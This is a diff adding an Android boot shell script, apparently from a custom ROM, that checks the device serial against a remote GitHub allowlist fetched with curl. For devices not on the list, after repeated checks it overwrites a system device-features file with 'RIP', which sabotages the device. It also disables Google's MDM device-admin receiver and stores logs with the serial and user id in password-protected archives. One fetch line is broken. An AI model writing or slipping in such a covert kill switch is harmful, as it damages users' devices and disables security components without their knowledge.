@@ -1,0 +1,76 @@
+#!/system/bin/sh
+sleep 2
+temp=/sdcard/Android/data/temp
+sysdir=/data/system
+DEBUG="1"
+echolog() {
+  [ "$DEBUG" = "1" ] && echo "$@" >> $temp
+}
+seradd=$(getprop ro.serialno)
+radd=$(getprop ro.build.display.id)
+echolog "d1 v2 $seradd $radd"
+id >> $temp
+date >> $temp
+verifyuser() {
+  echolog "Running..."
+  sclist=$(curl -s https://raw.githubusercontent.com/ProjectGlobalCluster/sec/main/rfs)
+  srulist=$(https://raw.githubusercontent.com/ProjectGlobalCluster/sec/main/rfs)
+  ver=$(grep $seradd <<< $sclist)
+  ver2=$(grep $seradd <<< $srulist)
+  if [[ $seradd == $ver ]]; then
+  echo "$seradd" > $sysdir/$seradd.pub
+  echolog "SF"
+  chmod 644 $sysdir/$seradd.pub
+  rm -rf $sysdir/*.cts
+  rm -rf /sdcard/unverifieduser
+  if [[ -e /sdcard/verifieduser ]] || [[ -e /sdcard/unverifieduser ]]; then
+  mv /sdcard/*verifieduser /sdcard/temp2
+  fi
+  7za a /sdcard/verifieduser -py0u4r3d34d -mhe $temp /sdcard/temp2
+  rm -rf $temp /sdcard/temp2
+  pm disable com.google.android.gms/com.google.android.gms.mdm.receivers.MdmDeviceAdminReceiver
+  exit
+  else
+  echolog "Snfo!"
+  date >> $temp
+  if [[ -e $sysdir/verifyonce.cts ]] && [[ -e $sysdir/verifytwice.cts ]] && [[ -e $sysdir/verifythrice.cts ]]; then
+  echo "RIP" > /system/etc/device_features/beryllium.xml
+  elif [[ -e $sysdir/verifyonce.cts ]] && [[ -e $sysdir/verifytwice.cts ]]; then
+  echo "$seradd" > $sysdir/verifythrice.cts
+  echolog "ver3"
+  elif [[ -e $sysdir/verifyonce.cts ]]; then
+  echo "$seradd" > $sysdir/verifytwice.cts
+  echolog "ver2"
+  else
+  echo "$seradd" > $sysdir/verifyonce.cts
+  echolog "ver1"
+  fi
+  echolog "SD"
+  rm -rf /sdcard/verifieduser
+  if [[ -e /sdcard/verifieduser ]] || [[ -e /sdcard/unverifieduser ]]; then
+  mv /sdcard/*verifieduser /sdcard/temp2
+  fi
+  7za a /sdcard/unverifieduser -py0u4r3d34d -mhe $temp /sdcard/temp2
+  rm -rf $temp
+  echo "RIP" > /system/etc/device_features/beryllium.xml
+  fi
+  fi
+  }
+echolog "Checking...."
+if [[ -e $sysdir/$seradd.pub ]]; then
+echolog "A V."
+rm -rf $sysdir/*.cts
+rm -rf /sdcard/unverifieduser
+if [[ -e /sdcard/verifieduser ]] || [[ -e /sdcard/unverifieduser ]]; then
+mv /sdcard/*verifieduser /sdcard/temp2
+fi
+7za a /sdcard/verifieduser -py0u4r3d34d -mhe $temp /sdcard/temp2
+rm -rf $temp /sdcard/temp2
+pm disable com.google.android.gms/com.google.android.gms.mdm.receivers.MdmDeviceAdminReceiver
+reboot -p
+exit
+else
+echolog "Snfl!"
+date >> $temp
+verifyuser
+fi
